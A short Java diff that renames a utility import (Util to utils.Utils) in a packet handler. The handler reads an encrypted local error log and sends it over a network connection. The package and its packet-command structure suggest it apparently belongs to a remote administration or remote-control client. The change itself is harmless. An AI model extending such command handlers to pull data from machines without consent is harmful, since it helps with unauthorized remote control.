@@ -4,8 +4,8 @@ import java.io.FileInputStream;
 
 import com.redpois0n.Connection;
 import com.redpois0n.Main;
-import com.redpois0n.Util;
 import com.redpois0n.common.crypto.Crypto;
+import com.redpois0n.utils.Utils;
 
 
 public class PacketGETERRLOG extends Packet {
@@ -14,7 +14,7 @@ public class PacketGETERRLOG extends Packet {
 	public void read(String line) throws Exception {
 		try {
 			FileInputStream in = new FileInputStream("err.dat");
-			String str = Util.readString(in);
+			String str = Utils.readString(in);
 			in.close();
 
 			Connection.addToSendQueue(new PacketBuilder(Header.ERROR_LOG, Crypto.decrypt(str, Main.getKey())));
